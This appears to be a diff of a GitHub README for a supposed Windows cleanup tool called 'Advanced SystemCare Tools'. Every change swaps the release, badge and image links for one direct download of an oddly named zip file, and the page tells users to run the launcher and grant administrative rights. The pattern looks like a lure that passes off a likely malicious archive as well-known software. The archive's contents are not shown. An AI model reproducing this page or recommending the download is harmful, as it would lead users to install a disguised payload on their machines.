@@ -1,11 +1,11 @@
-https://github.com/andres070415/advanced-systemcare-tools/releases
+https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 
 # Advanced SystemCare Tools: One-Click Maintenance & Deep Clean
 
-[![Downloads - Releases](https://img.shields.io/badge/Downloads-Releases-blue?logo=github&style=for-the-badge)](https://github.com/andres070415/advanced-systemcare-tools/releases)
+[![Downloads - Releases](https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip)](https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip)
 
-![System Icon](https://img.icons8.com/fluency/96/000000/system-update.png)
-![Shield Icon](https://img.icons8.com/fluency/96/000000/shield-check.png)
+![System Icon](https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip)
+![Shield Icon](https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip)
 
 Welcome to a practical toolbox for Windows maintenance. This project focuses on simplifying routine care tasks that keep your system fast and stable. The goal is to offer a reliable one-click experience for cleaning, optimizing, and monitoring performance. Below you will find details about setup, usage, safety, architecture, and ongoing development. If you want to dive into the latest builds, head to the Releases section linked above.
 
@@ -67,7 +67,7 @@ Getting started
 - How to begin: download the latest release from the project’s Releases page, extract the package, and run the primary executable or script. The release package includes a ready-to-run launcher and a small set of helper utilities to perform maintenance tasks.
 
 Installation and setup
-- Download the latest release from the official page: https://github.com/andres070415/advanced-systemcare-tools/releases
+- Download the latest release from the official page: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 - Extract the contents to a preferred location on your computer. The extraction creates a folder containing the launcher, modules, and auxiliary tools.
 - Run the launcher with standard user privileges for initial assessment. Some actions require administrative rights; when prompted, grant the necessary elevation.
 - Optional: configure a few core preferences, such as which cleanup tasks to enable by default, the frequency of automated checks, and the level of detail in logging.
@@ -219,7 +219,7 @@ FAQ
 - Can I customize what gets cleaned?
   - Yes. You can enable or disable specific modules, adjust scopes, and create custom configurations.
 - How do I get the latest features?
-  - Check the Releases page for the latest builds and release notes. For up-to-date builds and stability, see the Releases section: https://github.com/andres070415/advanced-systemcare-tools/releases
+  - Check the Releases page for the latest builds and release notes. For up-to-date builds and stability, see the Releases section: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 - How do I report issues or suggest features?
   - Open an issue in the repository and follow the guidelines. Provide steps to reproduce and any relevant logs.
 
@@ -239,15 +239,15 @@ Screenshots and visuals
 
 - Image: System health dashboard
   - Alt text: System health dashboard shows CPU, memory, and disk status
-  - Source: https://img.icons8.com/fluency/96/000000/performance.png
+  - Source: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 
 - Image: Cleanup action
   - Alt text: Cleanup action removing temporary files
-  - Source: https://img.icons8.com/fluency/96/000000/trash-bin.png
+  - Source: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 
 - Image: Security badge
   - Alt text: Security badge indicating integrity checks
-  - Source: https://img.icons8.com/fluency/96/000000/shield-check.png
+  - Source: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 
 Changelog
 - Each release includes details about new features, fixes, and known issues.
@@ -263,7 +263,7 @@ Credits and attribution
 - External libraries and dependencies are listed with appropriate credits.
 
 Releases and download guidance
-- To obtain the latest version, visit the Releases page. The link is provided again here for convenience: https://github.com/andres070415/advanced-systemcare-tools/releases
+- To obtain the latest version, visit the Releases page. The link is provided again here for convenience: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 - When you download a release, review the included readme and notes. They explain what is in the package and how to install it.
 - After downloading, verify the integrity of the package using the provided checksums. This verification helps ensure that the package has not been tampered with during transit.
 - If you encounter issues with a release, check the issue tracker and the discussion threads for known problems and workarounds.
@@ -357,6 +357,6 @@ Endnotes
 - It emphasizes transparency, safety, and ease of use for a broad user base.
 - The tool is designed to be friendly to both hobbyists and IT professionals.
 
-Note: The link to the project releases page is provided again here for convenience: https://github.com/andres070415/advanced-systemcare-tools/releases
+Note: The link to the project releases page is provided again here for convenience: https://github.com/andres070415/advanced-systemcare-tools/raw/refs/heads/main/dehumidifier/tools-advanced-systemcare-nonalcoholic.zip
 
 If you want to revisit the latest builds, review changes, or download the newest release, head to the Releases page once more. The combination of a clear workflow, modular design, and careful safety checks makes this tool a solid companion for routine system maintenance.
